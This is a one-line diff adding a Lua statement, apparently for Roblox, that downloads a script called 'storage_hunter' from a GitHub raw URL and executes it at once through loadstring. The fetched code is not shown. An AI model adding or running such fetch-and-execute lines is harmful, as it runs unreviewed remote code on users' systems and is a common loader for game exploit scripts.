@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vxmpie/storage_hunter/main/src/main.lua"))()
